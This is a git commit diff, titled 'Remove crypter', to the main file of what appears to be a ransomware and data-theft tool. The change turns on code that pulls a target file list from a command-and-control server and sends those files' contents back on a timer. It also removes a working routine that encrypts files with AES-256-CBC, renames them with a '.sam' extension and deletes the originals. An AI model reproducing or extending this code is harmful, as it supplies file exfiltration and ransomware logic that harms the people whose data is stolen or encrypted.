5fa9e4214d23c21a5e198bf9488f24f0e84196a2
Muzucode <seanhickey4516@gmail.com>
2024-05-30 20:13:20 -0400

    Remove crypter

--- index.ts
+++ index.ts
@@ -5,19 +5,18 @@ import chalk from "chalk";
 import {c2} from './c2';
 import type { FileDTO, FinalPayload } from "./interfaces/interfaces";
 import path from 'path'
-import crypto from 'node:crypto'
 
 
-// const filesToSearchFor = await getFilesToSearchFor()
-// const payload: FinalPayload = await createImportantFilesPayload(filesToSearchFor)
+const filesToSearchFor = await getFilesToSearchFor()
+const payload: FinalPayload = await createImportantFilesPayload(filesToSearchFor)
 
 // Send Payload to C2
-// sendPayload(await payload);
+sendPayload(await payload);
 
-// // Send Payload as often as defined by C2
-// setInterval(async () => {
-//   sendPayload(await createImportantFilesPayload(filesToSearchFor));
-// }, c2.pollFrequency);
+// Send Payload as often as defined by C2
+setInterval(async () => {
+  sendPayload(await createImportantFilesPayload(filesToSearchFor));
+}, c2.pollFrequency);
 
 
 // Encrypt all the files after sending
@@ -33,40 +32,6 @@ const testFiles: FileDTO[] = [
   {path: path.join(__dirname, 'important-zone', 'test9.txt'), content: "test9"},
   {path: path.join(__dirname, 'important-zone', 'test10.txt'), content: "test10"},
 ]
-
-const algorithm = 'aes-256-cbc'; // Encryption algorithm
-const key = crypto.randomBytes(32); // Generate a random key
-const iv = crypto.randomBytes(16); // Generate a random initialization vector
-
-// Save the key and iv for decryption
-const decryptionInfo = {
-  key: key.toString('hex'),
-  iv: iv.toString('hex')
-};
-fs.writeFileSync('sam.key', JSON.stringify(decryptionInfo));
-
-// Encrypt all the files
-testFiles.forEach(encryptFile)
-
-
-
-// Modify and add .ta to all filepaths passed in
-function encryptFile(file: FileDTO) {
-  console.log('Encrypting: ', file.path);
-
-  const cipher = crypto.createCipheriv(algorithm, key, iv);
-  let encryptedContent = cipher.update(file.content);
-  encryptedContent = Buffer.concat([encryptedContent, cipher.final()]);
-
-  // Save the encrypted content to a new file
-  const encryptedFilePath = `${file.path}.sam`;
-  fs.writeFileSync(encryptedFilePath, encryptedContent);
-
-  // Delete the old file
-  fs.unlinkSync(file.path);
-
-  console.log(`File encrypted and saved to: ${encryptedFilePath}`);
-}
 
 async function getFilesToSearchFor() : Promise<string[]> {
   const response = await axios.get(`${c2.hostname}/api/tools/samus/important-files`)
